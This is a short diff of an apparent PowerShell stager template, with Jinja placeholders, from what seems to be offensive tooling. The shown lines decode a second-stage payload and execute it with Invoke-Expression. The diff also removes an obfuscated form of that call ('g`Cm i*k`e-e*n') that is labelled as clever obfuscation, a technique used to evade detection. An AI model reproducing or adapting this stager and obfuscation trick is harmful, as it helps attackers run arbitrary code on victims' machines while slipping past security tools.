@@ -65,5 +65,4 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
 
 ${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "{{stage2}}"
 
-{#clever obfuscation#}
-& (g`Cm i*k`e-e*n) ${{symbol_name("Code")}}
+Invoke-Expression ${{symbol_name("Code")}}
